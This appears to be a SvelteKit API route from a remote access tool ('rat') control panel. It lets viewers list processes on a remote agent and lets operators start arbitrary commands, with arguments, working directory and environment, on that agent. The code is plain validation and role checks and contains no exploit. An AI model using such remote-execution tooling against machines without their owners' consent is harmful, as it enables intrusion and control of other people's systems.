import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import { dispatchTaskManagerCommand, TaskManagerAgentError } from '$lib/server/rat/task-manager';
import { splitCommandLine } from '$lib/utils/command';
import type { StartProcessRequest, StartProcessResponse } from '$lib/types/task-manager';

function normalizeStartPayload(payload: StartProcessRequest): StartProcessRequest {
        const trimmedCommand = (payload.command ?? '').trim();
        if (!trimmedCommand) {
                throw error(400, 'Command is required');
        }

        const baseArgs = Array.isArray(payload.args)
                ? payload.args.filter((arg) => typeof arg === 'string' && arg.trim().length > 0)
                : [];

        let command = trimmedCommand;
        let args = baseArgs;
        if (args.length === 0) {
                const tokens = splitCommandLine(trimmedCommand);
                if (tokens.length === 0) {
                        throw error(400, 'Command is required');
                }
                command = tokens[0];
                args = tokens.slice(1);
        }

        const cwd = typeof payload.cwd === 'string' && payload.cwd.trim().length > 0 ? payload.cwd.trim() : undefined;
        const envEntries = payload.env
                ? Object.entries(payload.env).filter(
                                (entry): entry is [string, string] =>
                                        typeof entry[0] === 'string' && typeof entry[1] === 'string'
                        )
                : [];
        const env = envEntries.length > 0 ? Object.fromEntries(envEntries) : undefined;

        return { command, args, cwd, env } satisfies StartProcessRequest;
}

export const GET: RequestHandler = async ({ params, locals }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        requireViewer(locals.user);

        try {
                const result = await dispatchTaskManagerCommand(id, { operation: 'list' });
                return json(result);
        } catch (err) {
                if (err instanceof TaskManagerAgentError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to retrieve process list');
        }
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        const user = requireOperator(locals.user);

        let payload: StartProcessRequest;
        try {
                payload = (await request.json()) as StartProcessRequest;
        } catch {
                throw error(400, 'Invalid process start payload');
        }

        const normalized = normalizeStartPayload(payload);

        try {
                const result = await dispatchTaskManagerCommand(
                        id,
                        { operation: 'start', payload: normalized },
                        { operatorId: user.id }
                );
                return json(result satisfies StartProcessResponse, { status: 201 });
        } catch (err) {
                if (err instanceof TaskManagerAgentError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to start process');
        }
};
